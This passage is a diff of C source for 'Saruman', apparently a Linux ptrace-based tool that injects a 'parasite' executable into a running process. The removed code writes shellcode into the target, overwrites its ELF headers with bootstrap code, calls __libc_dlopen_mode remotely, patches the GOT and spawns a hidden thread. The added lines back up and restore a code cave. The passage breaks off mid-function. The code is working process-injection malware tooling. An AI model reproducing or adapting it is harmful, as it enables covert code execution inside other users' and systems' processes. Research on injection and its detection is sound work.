-	argc = h->payloads.function[func].argc;
-	
-	if (pid_attach_stateful(h) < 0) 
-		return -1;
-
-	if (ptrace(PTRACE_GETREGS, h->tasks.pid, NULL, pt_reg) < 0)
-		return -1;
-	
-	
-	entry_point = ip ? ip : h->payloads.function[func].target;
-  	
-	/* 
-	 * Which payload type?
-	 */
-	switch(h->payloads.function[func].ptype) {
-		case _PT_FUNCTION:
-			if (pid_write(h->tasks.pid, (void *)entry_point, (void *)shellcode, code_size) < 0)
-				return -1;
-			break;	
-		
-		case _PT_SYSCALL:
-			sc = (uint8_t *)alloca(ULONG_ROUND(h->payloads.function[func].size) + 16);
-#if DEBUG
-			for (i = 0; i < code_size + 8; i++) {
-				printf("%02x", shellcode[i]);
-				if (i % 32 == 0)
-					printf("\n");
-			}
-#endif
-			memcpy(sc, shellcode, code_size);		
-			for (i = 0; i < 4; i++)
-				sc[code_size + i] = 0xCC;
-			code_size += 4;
-		 	if (pid_write(h->tasks.pid, (void *)entry_point, (void *)sc, code_size) < 0)
-                                return -1;
-			break;
-	}
-
-		
-	pt_reg->rip = entry_point;
-	switch(argc) {
-		case 1:
-			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
-			break;
-		case 2:
-			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
-			pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
-			break;
-		case 3:
-			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
-			pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
-			pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
-			break;
-		case 4:
-		 	pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
-                        pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
-                        pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
-			pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
-			break;
-		case 5:
-			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
-                        pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
-                        pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
-                        pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
-			pt_reg->r8 =  (uintptr_t)h->payloads.function[func].args[4];
-			break;
-		case 6:
-			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
-                        pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
-                        pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
-                        pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
-                        pt_reg->r8 =  (uintptr_t)h->payloads.function[func].args[4];
-			pt_reg->r9 =  (uintptr_t)h->payloads.function[func].args[5];
-			break;
-	}
-	
-	if (ptrace(PTRACE_SETREGS, h->tasks.pid, NULL, pt_reg) < 0)
-		return -1;
-	
-	if (ptrace(PTRACE_CONT, h->tasks.pid, NULL, NULL) < 0)
-		return -1;
-	
-	waitpid2(h->tasks.pid, &status, 0);
-	
-	if (WSTOPSIG(status) != SIGTRAP) {
-		fprintf(stderr, "[!] No SIGTRAP received, something went wrong. Signal: %d\n", WSTOPSIG(status));
-		return -1;
-	}
-
-	/* Get return value */
-	if (ptrace(PTRACE_GETREGS, h->tasks.pid, NULL, pt_reg) < 0) {
-		perror("PTRACE_GETREGS");
-		return -1;
-	}
-
-	h->payloads.function[func].retval = (pt_reg_t)pt_reg->rax;
-	
-	
-	return 0;
-
-}
-
-int pt_memset(handle_t *h, void *target, size_t len)
-{
-        size_t i;
-        int sz = len / sizeof(void *);
-        uint64_t null = 0UL;
-        uint8_t *s = (uint8_t *)&null;
-        uint8_t *d = (uint8_t *)target;
-        int pid = h->tasks.pid;
-
-        while(sz-- != 0) {
-                long word = ptrace(PTRACE_POKETEXT, pid, d, s);
-                if (word == -1) {
-                        fprintf(stderr, "ptrace_memset failed, pid: %d: %s\n", pid, strerror(errno));
-                        return -1;
-                }
-                d += sizeof(long);
-        }
-        return 0;
-}
-
-int pt_mprotect(handle_t *h, void *addr, size_t len, int prot)
-{
-	struct user_regs_struct pt_reg;
-
-	h->payloads.function[SYS_MPROTECT].args[0] = addr; //addr;
-	h->payloads.function[SYS_MPROTECT].args[1] = (void *)(uintptr_t)len;
-	h->payloads.function[SYS_MPROTECT].args[2] = (void *)(uintptr_t)prot;
-	
-	
-	if (call_fn(SYS_MPROTECT, h, PT_CALL_REGION) < 0) {
-		printf("call_fn(SYS_MPROTECT, ...) failed: %s\n", strerror(errno));
-		return -1;
-	}
-	
-	return (int)h->payloads.function[SYS_MPROTECT].retval;
-}
-
-int pt_create_thread(handle_t *h, void (*fn)(void *), void *data, uint64_t stack)
-{
-	struct user_regs_struct pt_reg;
-	
-	h->payloads.function[CREATE_THREAD].args[0] = (void *)fn;
-	h->payloads.function[CREATE_THREAD].args[1] = data;
-	h->payloads.function[CREATE_THREAD].args[2] = (void *)(uint64_t)stack;
-
-	if (call_fn(CREATE_THREAD, h, 0) < 0) {
-		printf("call_fn(CREATE_THREAD, ...) failed: %s\n", strerror(errno));
-		return -1;
-	}
-	
-	printf("retval: %llx\n", h->payloads.function[CREATE_THREAD].retval);
-	return (int)h->payloads.function[CREATE_THREAD].retval;
-}
-
-
-static int dlopen_launch_parasite(handle_t *h)
-{
-	struct user_regs_struct tid_regs;
-	int status;
-	void (*entry)(void *) = (void *)h->entryp;
-	tid_t tid;
-	DBG_MSG("[+] Entry point: %p\n", entry);
-
-        if (pid_attach_stateful(h) < 0)
-                return -1;
-
-        /*
-         * zero out stack segment from 
-         */
-        pt_memset(h, (void *)STACK_TOP(h->stack.base), STACK_SIZE);
-
-        h->tasks.thread_count = 0;
-	
-        if ((h->tasks.thread[0] = pt_create_thread(h, entry, NULL, (uintptr_t)h->stack.base)) < 0) {
-                printf("[!] pt_create_thread() failed in process %d\n", h->tasks.pid);
-                exit(-1);
-        }
-
-        tid = h->tasks.thread[0];
-
-        printf("[+] Thread injection succeeded, tid: %d\n", h->tasks.thread[0]);
-	printf("[+] Saruman successfully injected program: %s\n", h->path);
-	return 0; 
-}
-
-
-static int launch_parasite(handle_t *h)
-{
-	struct user_regs_struct tid_regs;
-	int status;
-	void (*entry)(void *) = (void (*)(void *))(h->entryp + h->base);
-	tid_t tid;
-
-	DBG_MSG("[+] Entry point: %p\n", entry);
-
-	if (pid_attach_stateful(h) < 0)
-		return -1;
-	
 	/*
-	 * zero out stack segment from 
+	 * Something went wrong
 	 */
-	pt_memset(h, (void *)STACK_TOP(h->stack.base), STACK_SIZE);
-	
-	h->tasks.thread_count = 0; 
-	
-	if ((h->tasks.thread[0] = pt_create_thread(h, entry, NULL, (uintptr_t)h->stack.base)) < 0) {
-                printf("[!] pt_create_thread() failed in process %d\n", h->tasks.pid);
-                exit(-1);
-        }
-	
-	tid = h->tasks.thread[0];
-
-	printf("[+] Thread injection succeeded, tid: %d\n", h->tasks.thread[0]);
-
-	return 0;
-	
+	fprintf(stderr, "Failed... detaching\n");
+	saruman_ptrace_detach(ctx);
+	return false;
 }
 
 /*
- * XXX This function was only to test the parasite before
- * thread injection was working (Which it is now)
+ * We use a code-cave to store the initial boot code. We must backup the original
+ * code.
  */
-static int launch_parasite_no_thread(handle_t *h)
+bool saruman_backup_cave(struct saruman_ctx *ctx, uint64_t cave_addr,
+    size_t cave_len)
 {
-        struct user_regs_struct pt_reg = {0};
-        int status;
-        void *stackframe;
-	long null = 0L;
+	ctx->orig_code_cave = malloc(cave_len);
 
-        if (pid_attach_stateful(h) < 0)
-                return -1;
+	if (ctx->orig_code_cave == NULL) {
+		perror("malloc");
+		return false;
+	}
 
-	pt_memset(h, (void *)STACK_TOP(h->stack.base), STACK_SIZE);
-        
-	h->pt_reg.rip = (uint64_t)h->entryp + h->base;
-        h->pt_reg.rsp = (uint64_t)h->stack.base;
-	
-        if (ptrace(PTRACE_SETREGS, h->tasks.pid, NULL, &h->pt_reg) < 0) {
-                perror("PTRACE_SETREGS");
-                return -1;
-        }
-	
-        return 0;
+	ctx->cave_len = cave_len;
+	ctx->orig_code_cave_addr = cave_addr;
+	if (saruman_ptrace_read(ctx, ctx->orig_code_cave, (void *)cave_addr, cave_len) == false) {
+		fprintf(stderr, "saruman_ptrace_read() failed on %#lx\n", cave_addr);
+		return false;
+	}
+
+	return true;
 }
 
-int run_exec_loader_dlopen(handle_t *h)
-{
-	size_t codesize;
-        void *mapped;
-        struct user_regs_struct pt_reg;
-        int i;
-        char buf[4096];
-        char tmp[32], tmp2[32];
-        struct linking_info *linfo = h->linfo;
-	void *ascii_storage = (void *)((unsigned long)h->stack.base - 512);
-
-	if (pid_attach_stateful(h) < 0)
-		return -1;
-	
-	if (pid_write(h->tasks.pid, (void *)ascii_storage, (void *)h->path, strlen(h->path) + 16) < 0)
-		return -1;
-
-	if (pid_read(h->tasks.pid, (void *)tmp, (void *)ascii_storage, strlen(h->path) + 16) < 0)
-		return -1;
-	
-	DBG_MSG("[DEBUG]-> parasite path: %s\n", tmp);
-
-	h->payloads.function[DLOPEN_EXEC_LOADER].args[0] = (void *)ascii_storage; /* "./parasite" */
-
-	DBG_MSG("[DEBUG]-> address of __libc_dlopen_mode(): %p\n", 
-	h->payloads.function[DLOPEN_EXEC_LOADER].args[1]);
-
-	/* NOTE: args[1] is already set to the address of function __libc_dlopen_mode() */
-
-	if (call_fn(DLOPEN_EXEC_LOADER, h, 0) < 0) {
-		printf("call_fn(DLOPEN_EXEC_LOADER, ...) failed: %s\n", strerror(errno));
-		return -1;
-	}
-	
-
-	printf("DLOPEN_EXEC_LOADER-> ret val: %llx\n", h->payloads.function[DLOPEN_EXEC_LOADER].retval);
-	
-	return 0;
-}
-
-int run_exec_loader(handle_t *h)
-{
-	size_t codesize;
-	void *mapped;
-	struct user_regs_struct pt_reg;
-	int i;
-	char buf[4096];
-	char tmp[32];
-	struct linking_info *linfo = h->linfo;
-	void *ascii_storage = (void *)((unsigned long)h->stack.base - 512);
-
-	
-	if (pid_attach_stateful(h) < 0)
-		return -1;
-	
-	if (pid_write(h->tasks.pid, (void *)ascii_storage, (void *)TMP_PATH, strlen(TMP_PATH) + 16) < 0)
-		return -1;
-	
-	if (pid_read(h->tasks.pid, (void *)tmp, (void *)ascii_storage, strlen(h->path) + 16) < 0)
-		return -1;
-	
-	DBG_MSG("[DEBUG]-> parasite path: %s\n", tmp);
-	
-	h->payloads.function[EXEC_LOADER].args[0] = (void *)ascii_storage;
-	
-	if (call_fn(EXEC_LOADER, h, 0) < 0) {
-		printf("call_fn(EXEC_LOADER, ...) failed: %s\n", strerror(errno));
-		return -1;
-	}
-	
-	printf("ret val: %llx\n", h->payloads.function[EXEC_LOADER].retval);
-	/*
-	 * XXX We no longer need this code as we handle all of the relocations
-	 * and write the fixed up executable to /tmp/parasite.elf file.
-	 
-	for (i = 0; i < h->linfo[0].count; i++) {
-		if(!h->linfo[i].resolved) 
-			continue;
-		if (pid_write(h->tasks.pid, (void *)(h->dataVaddr + linfo[i].gotOffset), (void *)&linfo[i].resolved, sizeof(void *)))
-			return -1;
-	}
-
-	*/
-
-	return 0;
-}
-
-
-/*
- * Inject bootstrap code (Which creates a memory mapping for us
-   to store our executable loading code)
- */
-int run_bootstrap(handle_t *h)
-{
-	struct user_regs_struct pt_reg, pt_reg_orig;
-	char maps[MAX_PATH - 1], line[256], tmp[32];
-	char *p, *start;
-	uint8_t *origcode;
-	FILE *fd;
-	Elf64_Ehdr *ehdr;
-	Elf64_Phdr *phdr;
-	uint32_t codesize;
-	int i, status, ret;
-	
-	
-	snprintf(maps, MAX_PATH - 1, "/proc/%d/maps", h->tasks.pid);
-	
-	if ((fd = fopen(maps, "r")) == NULL) {
-		fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
-		return -1;
-	}
-	while (fgets(line, sizeof(line), fd)) {
-		
-		if ((p = strchr(line, '/')) == NULL)
-			continue;
-		*(char *)strchr(p, '\n') = '\0';
-		h->remote.path = strdup(p);
-		h->remote.fd = open(h->remote.path, O_RDONLY);
-		if (h->remote.fd < 0) {
-			fprintf(stderr, "Canot open %s for reading: %s\n", h->remote.path, strerror(errno));
-			return -1;
-		}
-
-		for (i = 0, start = tmp, p = line; *p != '-'; i++, p++)
-			start[i] = *p;
-		start[i] = '\0';
-		h->remote.base = strtoul(start, NULL, 16);
-		break;
+bool saruman_restore_cave(struct saruman_ctx *ctx)
+{		
+	if (saruman_ptrace_write(ctx, (void *)ctx->orig_code_cave_addr,
+	    ctx->orig_code_cave, ctx->cave_len) == false) {
+		fprintf(stderr, "saruman_ptrace_write() failed on %#lx\n", ctx->orig_code_cave_addr);
+		return false;
 	}	
-	
-	origcode = (uint8_t *)heapAlloc(codesize = h->payloads.function[BOOTSTRAP_CODE].size);
-	h->payloads.function[BOOTSTRAP_CODE].target = h->remote.base;
-	
-	if (pid_attach_stateful(h) < 0) 
-		return -1;
-	
-	if (pid_read(h->tasks.pid, (void *)origcode, (void *)h->remote.base, codesize) < 0) 
-		return -1; 
-	
-	/*
-	 * h->remote.base contains the address of the hosts text segment where
-	 * we overwrite the ELF file hdr and phdr's with bootstrap_code()
-	 */
-	printf("Calling bootstrap code\n");
-	if (call_fn(BOOTSTRAP_CODE, h, h->remote.base)) {
-		printf("call_fn(BOOTSTRAP_CODE, ...) failed: %s\n", strerror(errno));
-		return -1;
-	} 
-	
-	h->stack.base = (void *)h->payloads.function[BOOTSTRAP_CODE].retval + STACK_SIZE;
-
-	DBG_MSG("[+] base (or highest address) of stack: %p\n", h->stack.base);
-	
-	if (pid_write(h->tasks.pid, (void *)h->remote.base, (void *)origcode, codesize) < 0) 
-		return -1;
-	
-	/* bootstrap code now has created anonymous memory mapping to store 
-	 * our loading code.
-	 */
-	
-	return 0;
-}	
-
-/*
- * Allocates a buffer in which it stores the
- * bytecode for a function (Such as create_thread)
- */  
-uint8_t * create_fn_shellcode(void (*fn)(), size_t len)
-{
-	size_t i;
-	uint8_t *shellcode = (uint8_t *)heapAlloc(len);
-	uint8_t *p = (uint8_t *)fn;
-
-	for (i = 0; i < len; i++) 
-		*(shellcode + i) = *p++;
-
-	return shellcode;
-	
+	return true;	
 }
 
-Elf64_Addr randomize_base(void)
-{	
-	uint32_t v;
-	uint32_t b;
-	
-	struct timeval tv;
-	
-	gettimeofday(&tv, NULL);
-	srand(tv.tv_usec); 
-	
-	b = rand() % 0xF;
-	b <<= 24;
-	
-	gettimeofday(&tv, NULL);
-	srand(tv.tv_usec);
-
-        v = _PAGE_ALIGN(b + (rand() & 0x0000ffff));
-	
-	return (uint64_t)v;
-}
-
-
-int map_elf_binary(handle_t *h,  const char *path)
+bool saruman_find_bootloader_cave(struct saruman_ctx *ctx)
 {
-	int fd, i, j;
-	uint8_t *mem;
-	Elf64_Ehdr *ehdr;
-	Elf64_Phdr *phdr;
-	Elf64_Shdr *shdr;
-	Elf64_Sym  *sym;
-	Elf64_Dyn *dyn;
-	char *StringTable;
-	
-	if ((fd = open(path, O_RDWR)) < 0) {
-		perror("open");
-		return -1;
-	}
-	
-	if ((h->path = strdup(path)) == NULL) {
-		perror("strdup");
-		return -1;
-	}
+	FILE *fp;
+	char path[4096], buf[4096];
+	char *p;
 
-	if (fstat(fd, &h->st) < 0) {
-		perror("fstat");
-		return -1;
-	}
-
-	mem = mmap(NULL, h->st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
-	if (mem == MAP_FAILED) {
-		perror("mmap");
-		return -1;
-	}
-
-	if (mem[0] != 0x7f && strcmp((char *)&mem[1], "ELF")) {
-		printf("File %s is not an ELF executable\n", path);
-		return -1;
-	}
-
-	h->mem = mem;
-	h->ehdr = ehdr = (Elf64_Ehdr *)mem;
-	h->phdr = phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
-	h->shdr = shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
-	h->entryp = (void *)resolve_symbol("main", h->mem);
-	printf("[+] Parasite entry point will be main(): %p\n", h->entryp);
-	
-	h->strtab = (char *)&mem[shdr[ehdr->e_shstrndx].sh_offset];
-	
-	for (i = 0; i < ehdr->e_phnum; i++) {
-		switch(phdr[i].p_type) {		
-			case PT_LOAD:
-				switch (!!phdr[i].p_offset) {
-					case 0:
-						printf("[+] Found text segment\n");
-						h->textVaddr = phdr[i].p_vaddr;
-						h->textOff = phdr[i].p_offset;
-						h->textSize = phdr[i].p_memsz;
-						break;
-					case 1:
-						printf("[+] Found data segment\n");
-						h->o_dataVaddr = h->dataVaddr = phdr[i].p_vaddr;
-						h->dataOff = phdr[i].p_offset;
-						h->dataSize = phdr[i].p_memsz;
-						h->datafilesz = phdr[i].p_filesz;
-						break;
-				} 
-				break;
-			case PT_DYNAMIC:
-				printf("[+] Found dynamic segment\n");
-				h->dyn = dyn = (Elf64_Dyn *)&mem[phdr[i].p_offset];
-				for (j = 0; dyn[j].d_tag != DT_NULL; j++) {
-					switch(dyn[j].d_tag) {
-						case DT_PLTGOT:
-							printf("[+] Found G.O.T\n");
-							h->gotVaddr = dyn[j].d_un.d_ptr;
-							h->gotOff = dyn[j].d_un.d_ptr - h->dataVaddr;
-							h->GOT = (Elf64_Addr *)&h->mem[h->dataOff + h->gotOff];
-							break;
-						case DT_PLTRELSZ:
-							printf("[+] PLT count: %i entries\n", (int)dyn[j].d_un.d_val);
-							h->pltSize = dyn[j].d_un.d_val / sizeof(Elf64_Rela);
-							break;
-						case DT_SYMTAB:
-							printf("[+] Found dynamic symbol table\n");
-							h->dsymVaddr = dyn[j].d_un.d_ptr;
-							break;
-						case DT_STRTAB:
-							printf("[+] Found dynamic string table\n");
-							h->dstrVaddr = dyn[j].d_un.d_ptr;
-							break;
-					}
-				}
-				break;
-		}
-	}
-	//close(fd);
-	return 0;
-
-}
-
-/*
- * This function prepares the initial calculations and
- * loads the shellcode necessary for RPPC (Remote process
- * procedure calls). These can be of type PT_SYSCALL or
- * PT_FUNCTION.
- */
-	
-void prepare_fn_payloads(payloads_t *payloads, handle_t *h)
-{
-	int i;
-
-	for (i = 0; i < FUNCTION_PAYLOADS; i++) {
-		switch(i) {
-			case CREATE_THREAD:
-				payloads->function[i].size = f12 - f11;
-				payloads->function[i].shellcode = create_fn_shellcode((void *)&create_thread, payloads->function[i].size);	
-				payloads->function[i].target = INIT_CODE_REGION;
-				payloads->function[i].ptype = _PT_SYSCALL;
-				payloads->function[i].args[0] = NULL;
-				payloads->function[i].args[1] = NULL;
-				payloads->function[i].args[2] = NULL;
-				payloads->function[i].argc = 3;
-				break;
-			case EXEC_LOADER:
-				payloads->function[i].size = f4 - f3;
-				payloads->function[i].shellcode = create_fn_shellcode((void *)&load_exec, payloads->function[i].size);
-				payloads->function[i].target = INIT_CODE_REGION;
-				payloads->function[i].args[0] = (void *)NULL; // until we assign it h->path
-				payloads->function[i].args[1] = (void *)(h->textVaddr += h->base);
-				payloads->function[i].args[2] = (void *)(h->dataVaddr += h->base);
-				payloads->function[i].args[3] = (void *)(uint64_t)h->textSize;
-				payloads->function[i].args[4] = (void *)(uint64_t)h->dataSize;
-				payloads->function[i].args[5] = (void *)(uint64_t)h->dataOff;
-				payloads->function[i].argc = 6;	
-				payloads->function[i].ptype = _PT_FUNCTION;
-				break;
-			case DLOPEN_EXEC_LOADER:
-				payloads->function[i].size = f3 - f2;
-				payloads->function[i].shellcode = create_fn_shellcode((void *)&dlopen_load_exec, payloads->function[i].size);
-				payloads->function[i].target = INIT_CODE_REGION;
-				payloads->function[i].args[0] = (void *)NULL; // until we assign it h->path;
-				payloads->function[i].args[1] = (void *)get_sym_from_libc(h, "__libc_dlopen_mode");
-				payloads->function[i].argc = 2;
-				break;
-			case EVIL_PTRACE: /* UNUSED AS REMOTE FUNCTION */
-			        payloads->function[i].size = f10 - f9;
-				payloads->function[i].shellcode = create_fn_shellcode((void *)&evil_ptrace, payloads->function[i].size);
-				payloads->function[i].target = 0;
-				break;	
-			case BOOTSTRAP_CODE:
-				payloads->function[i].size = f2 - f1;
-				payloads->function[i].shellcode = create_fn_shellcode((void *)&bootstrap_code, payloads->function[i].size);
-				payloads->function[i].target = 0;
-				payloads->function[i].args[0] = (void *)INIT_CODE_REGION;
-				payloads->function[i].args[1] = (void *)payloads->function[CREATE_THREAD].size +
-									payloads->function[EXEC_LOADER].size + 
-									payloads->function[EVIL_PTRACE].size + 
-									payloads->function[BOOTSTRAP_CODE].size;
-				payloads->function[i].args[2] = (void *)randomize_base();
-				payloads->function[i].argc = 3;
-				payloads->function[i].ptype = _PT_FUNCTION;
-				break;
-			case SYS_MPROTECT:
-				payloads->function[i].size = f13 - f12;
-				payloads->function[i].shellcode = create_fn_shellcode((void *)&SYS_mprotect, payloads->function[i].size);
-				payloads->function[i].target = INIT_CODE_REGION;
-				payloads->function[i].args[0] = NULL;
-				payloads->function[i].args[1] = NULL;
-				payloads->function[i].args[2] = NULL;
-				payloads->function[i].argc = 3;
-				payloads->function[i].ptype = _PT_FUNCTION;
-				break;
-		}
-	}
-}
-
-char * get_section_index(int section, uint8_t *target)
-{
-        
-        int i;
-        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)target;
-        Elf64_Shdr *shdr = (Elf64_Shdr *)(target + ehdr->e_shoff);
-        
-        for (i = 0; i < ehdr->e_shnum; i++) {
-                if (i == section)
-                        return (target + shdr[i].sh_offset);
-        }
-
-}
-
-unsigned long get_libc_addr(int pid)
-{
-        FILE *fd;
-        char buf[255], file[255];
-        char *p, *q;
-        Elf64_Addr start, stop;
-
-        snprintf(file, sizeof(file)-1, "/proc/%d/maps", pid);
-        
-        if ((fd = fopen(file, "r")) == NULL) {
-                printf("fopen %s: %s\n", file, strerror(errno));
-                exit(-1);
-        }
-        
-        while (fgets(buf, sizeof(buf), fd)) {
-                if (strstr(buf, "libc") && strstr(buf, ".so")) {
-                        if ((p = strchr(buf, '-'))) 
-                                *p = '\0';
-                        
-                        start = strtoul(buf, NULL, 16);
-                        p++;
-                        stop = strtoul(p, NULL, 16);
-                        
-                        globals.libc_vma_size = stop - start;
-                        /* While we're at it get the path too */
-                        while (*p != '/')
-                                p++;
-                        *(char *)strchr(p, '\n') = '\0';
-                        globals.libc_path = strdup(p);
-                        if (!globals.libc_path) {
-                                perror("strdup");
-                                exit(-1);
-                        }
-                        globals.libc_addr = start;
-                        return start;
-                }
-        }
-
-}
-
-Elf64_Addr get_sym_from_libc(handle_t *h, const char *name)
-{
-	int fd, i;
-	struct stat st;
-	Elf64_Addr libc_base_addr = get_libc_addr(h->tasks.pid);
-	Elf64_Addr symaddr;
-	
-	if ((fd = open(globals.libc_path, O_RDONLY)) < 0) {
-		perror("open libc");
-		exit(-1);
-	}
-	
-	if (fstat(fd, &st) < 0) {
-		perror("fstat libc");
-		exit(-1);
-	}
-	
-	uint8_t *libcp = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-	if (libcp == MAP_FAILED) {
-		perror("mmap libc");
-		exit(-1);
-	}
-	
-	symaddr = resolve_symbol((char *)name, libcp);
-	if (symaddr == 0) {
-		printf("[!] resolve_symbol failed for symbol '%s'\n", name);
-		printf("Try using --manual-elf-loading option\n");
-		exit(-1);
-	}
-	symaddr = symaddr + globals.libc_addr; 
-
-	DBG_MSG("[DEBUG]-> get_sym_from_libc() addr of __libc_dl_*: %lx\n", symaddr);
-	return symaddr;
-
-}
-/*
- * Resolve libc symbols using computation:
- * symval = B + A
- */
-int fixup_got(handle_t *h)
-{
-        int i, slot;
-        struct linking_info *link;
-        Elf64_Addr got_sym_addr, symaddr;
-        Elf64_Addr libc_addr, tmp;
-        unsigned int libc_sym_addr;
-        
-        h->linfo = link = (struct linking_info *)(uintptr_t)get_reloc_data(h);
-        if (!link) {
-                printf("Unable to resolve Global offset table symbols\n");
-                exit(-1);
-        }
-
-        get_libc_addr(h->tasks.pid);
-
-        int fd;
-        struct stat st;
-
-        if ((fd = open(globals.libc_path, O_RDONLY)) < 0) {
-                perror("open libc");
-                exit(-1);
-        }
-
-        if (fstat(fd, &st) < 0) {
-                perror("fstat");
-                exit(-1);
-        }
-        
-        /*
-         * Map libc into memory, and resolve its symbols.
-         */
-        uint8_t *libcp = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-        for (slot = 0, i = 0; i < link[0].count; i++) {
-                if (link[i].r_type != R_X86_64_JUMP_SLOT)
-                        continue;
-		slot++;
-                libc_sym_addr = resolve_symbol(link[i].name, libcp);
-                tmp = libc_sym_addr + globals.libc_addr;
-                printf("[+] FUNC %s -> Assigning value %lx to GOT(%lx)\n", link[i].name, tmp, h->gotVaddr + ((slot + 2) * sizeof(void *)));
-		h->GOT[slot + 2] = tmp;
-		link[i].gotOffset = h->gotOff + ((slot + 2) * sizeof(void *));
-		link[i].resolved = tmp;
-        }                               
-	
-	munmap(libcp, st.st_size);       
-        close(fd);
-
-        return 0;
-}
-
-Elf64_Addr resolve_symbol(char *name, uint8_t *target)
-{
-        Elf64_Sym *symtab;
-        char *SymStrTable;
-        int i, j, symcount;
-
-        Elf64_Off strtab_off;
-        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)target;
-        Elf64_Shdr *shdr = (Elf64_Shdr *)(target + ehdr->e_shoff);
-
-        for (i = 0; i < ehdr->e_shnum; i++) {
-                if (shdr[i].sh_type == SHT_SYMTAB || shdr[i].sh_type == SHT_DYNSYM) {
-                        /* 
-                         * In this instance of the sh_link member of Elf64_Shdr, it points
-                         * to the section header index of the symbol table string table section.
-                         */
-                        SymStrTable = (char *)get_section_index(shdr[i].sh_link, target);
-                        symtab = (Elf64_Sym *)get_section_index(i, target);
-                        for (j = 0; j < shdr[i].sh_size / sizeof(Elf64_Sym); j++, symtab++) {
-                                if(strcmp(&SymStrTable[symtab->st_name], name) == 0) {
-                                        return (symtab->st_value);
-                                }
-                        }
-                }
-        }
-        return 0;
-} 
-
-/*
- * This function retrieves data from X86_64_JUMP_SLOT
- * relocation types. (GOT entries for dynamic linking)
- */
-struct linking_info *get_reloc_data(handle_t *target)
-{
-        Elf64_Shdr *shdr, *shdrp, *symshdr;
-        Elf64_Sym *syms, *symsp;
-        Elf64_Rel *rel;
-	Elf64_Rela *rela;
-        Elf64_Ehdr *ehdr;
-
-        char *symbol;
-        int i, j, symcount, k;
-
-        struct linking_info *link;
-
-        uint8_t *mem = (uint8_t *)target->mem;
-
-        ehdr = (Elf64_Ehdr *)mem;
-        shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);
-
-        shdrp = shdr;
-
-        for (i = ehdr->e_shnum; i-- > 0; shdrp++) {
-                if (shdrp->sh_type == SHT_DYNSYM) {
-                        symshdr = &shdr[shdrp->sh_link];
-                        if ((symbol = malloc(symshdr->sh_size)) == NULL)
-                                goto fatal;
-                        memcpy(symbol, (mem + symshdr->sh_offset), symshdr->sh_size);
-
-                        if ((syms = (Elf64_Sym *)malloc(shdrp->sh_size)) == NULL)
-                                goto fatal;
-
-                        memcpy((Elf64_Sym *)syms, (Elf64_Sym *)(mem + shdrp->sh_offset), shdrp->sh_size);
-                        symsp = syms;
-
-                        symcount = (shdrp->sh_size / sizeof(Elf64_Sym));
-                        link = (struct linking_info *)malloc(sizeof(struct linking_info) * symcount);
-                        if (!link)
-                                goto fatal;
-                        link[0].count = symcount;
-                        for (j = 0; j < symcount; j++, symsp++) {
-                                link[j].name = strdup(&symbol[symsp->st_name]);
-                                if (!link[j].name)
-                                        goto fatal;
-                                link[j].s_value = symsp->st_value;
-                                link[j].index = j;
-                        }
-                        break;
-   		}
-        }
-        for (i = ehdr->e_shnum; i-- > 0; shdr++) {
-                switch(shdr->sh_type) {
-                        case SHT_RELA:
-                                 rela = (Elf64_Rela *)(mem + shdr->sh_offset);
-                                 for (j = 0; j < shdr->sh_size; j += sizeof(Elf64_Rela), rela++) {
-                                        for (k = 0; k < symcount; k++) {
-                                                if (ELF64_R_SYM(rela->r_info) == link[k].index) {
-                                                        link[k].r_offset = rela->r_offset;
-                                                        link[k].r_info = rela->r_info;
-                                                        link[k].r_type = ELF64_R_TYPE(rela->r_info);
-                                                }
-
-                                        }
-                                 }
-                                 break;
-                        case SHT_REL:
-				 rel = (Elf64_Rel *)(mem + shdr->sh_offset);
-                                 for (j = 0; j < shdr->sh_size; j += sizeof(Elf64_Rel), rel++) {
-                                        for (k = 0; k < symcount; k++) {
-                                                if (ELF64_R_SYM(rel->r_info) == link[k].index) {
-                                                        link[k].r_offset = rel->r_offset;
-                                                        link[k].r_info = rel->r_info;
-                                                        link[k].r_type = ELF64_R_TYPE(rel->r_info);
-                                                }
-
-                                        }
-                                 }
-
-                                break;
-
-                        default:
-                                break;
-                }
-        }
-
-        return link;
-        fatal:
-                return NULL;
-}
-
-/*
- * Apply ELF relocations of type RELATIVE and GLOBAL_DAT
- */
-int apply_relocs(handle_t *h)
-{ 
-	int i, j, k;
-	Elf64_Shdr *shdr, *targetShdr;
-	Elf64_Rela *rel;
-	struct linking_info *linfo = h->linfo;
-	Elf64_Sym *symtab, *symbol;
-	Elf64_Addr targetAddr, symval;
-	Elf64_Addr *relocPtr;
-	int dynstr;
-	char *StringTable;
-		
-	for (shdr = h->shdr, i = 0; i < h->ehdr->e_shnum; i++)
-		if (shdr[i].sh_type == SHT_STRTAB && i != h->ehdr->e_shstrndx) {
-			dynstr = i;
-			break;
-		}
-	
-	StringTable = (char *)&h->mem[shdr[dynstr].sh_offset];
-
-	for (shdr = h->shdr, i = 0; i < h->ehdr->e_shnum; i++) {
-		if (shdr[i].sh_type == SHT_RELA) {
-			rel = (Elf64_Rela *)&h->mem[shdr[i].sh_offset];
-			for (j = 0; j < shdr[i].sh_size / sizeof(Elf64_Rela); j++, rel++) {
